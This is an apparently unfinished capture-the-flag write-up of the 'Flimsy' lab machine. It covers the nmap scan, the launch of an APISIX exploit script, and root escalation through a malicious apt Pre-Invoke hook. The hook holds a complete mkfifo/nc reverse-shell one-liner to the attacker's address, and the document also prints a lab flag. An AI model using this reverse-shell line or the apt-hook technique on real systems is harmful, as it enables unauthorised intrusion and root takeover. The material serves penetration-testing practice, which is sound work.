---
title: Flimsy
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Flimsy]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.165.220
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 15:50 +0900
Nmap scan report for 192.168.165.220
Host is up (0.091s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open  http                nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Upright
3306/tcp  open  mysql               MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https?
43500/tcp open  http                OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   90.10 ms 192.168.45.1
2   90.04 ms 192.168.45.254
3   90.86 ms 192.168.251.1
4   91.12 ms 192.168.165.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.63 seconds
```

http://192.168.165.220/
![](../../../assets/images/Pasted%20image%2020260613155435.png)

http://192.168.165.220:9443/
![](../../../assets/images/Pasted%20image%2020260613155405.png)

http://192.168.165.220:43500/
![](../../../assets/images/Pasted%20image%2020260613155339.png)

![](../../../assets/images/Pasted%20image%2020260613155556.png)

```zsh

```

```zsh

```

```zsh

```

```zsh

```

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Flimsy]
└─$ python3 apisix-exploit.py http://192.168.165.220:43500/ 192.168.45.204 4444
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Flimsy]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.165.220] 46842

id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
which python
/bin/python
which python3
/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
franklin@flimsy:/root$ id
id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
franklin@flimsy:/root$ 
```

```zsh
franklin@flimsy:/root$ cat /home/franklin/local.txt
cat /home/franklin/local.txt
97bcc9386449a99070b51dd2e9e9f826
franklin@flimsy:/root$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:51:92 brd ff:ff:ff:ff:ff:ff
    inet 192.168.165.220/24 brd 192.168.165.255 scope global ens160
       valid_lft forever preferred_lft forever
```
![](../../../assets/images/Pasted%20image%2020260613160235.png)

```zsh
./linpeas.sh
```

![](../../../assets/images/Pasted%20image%2020260613202427.png)

```zsh
franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.204 1234 >/tmp/f"};' > pwn
<sh -i 2>&1|nc 192.168.45.204 1234 >/tmp/f"};' > pwn
franklin@flimsy:/etc/apt/apt.conf.d$ cat /etc/rontab
cat /etc/rontab
cat: /etc/rontab: No such file or directory
franklin@flimsy:/etc/apt/apt.conf.d$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root apt-get update
* * * * * root /root/run.sh
```

https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

![](../../../assets/images/Pasted%20image%2020260614011221.png)

```zsh
franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.204 1234 >/tmp/f"};' > pwn
<sh -i 2>&1|nc 192.168.45.204 1234 >/tmp/f"};' > pwn
franklin@flimsy:/etc/apt/apt.conf.d$ 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Flimsy]
└─$ rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.165.220] 41440
/bin/sh: 0: can't access tty; job control turned off
# 
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/proof.txt

# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:cc:57 brd ff:ff:ff:ff:ff:ff
    inet 192.168.165.220/24 brd 192.168.165.255 scope global ens160
       valid_lft forever preferred_lft forever
# 

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>